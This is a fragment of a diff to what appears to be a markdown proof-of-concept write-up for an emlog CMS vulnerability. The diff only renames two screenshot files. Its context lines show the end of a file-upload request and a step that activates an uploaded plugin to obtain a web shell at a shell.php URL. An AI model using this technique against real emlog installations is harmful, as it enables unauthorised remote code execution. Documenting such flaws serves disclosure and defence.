@@ -29,12 +29,12 @@ Content-Disposition: form-data; name="token"
 4e1bef9d513bae43a46448cbbaee0db7d1d5f7d1
 ------WebKitFormBoundaryOK8HOjtKZalBj6CG--
 ```
-![](emlog_01.jpg)
+![](emlog-01.jpg)
 
 ## 2. Active the plugin you uploaded and get a shell!
 ### payload
 ```
 http://192.168.111.155//emlog/content/plugins/shell/shell.php
 ```
-![](emlog_02.jpg)
+![](emlog-02.jpg)
 
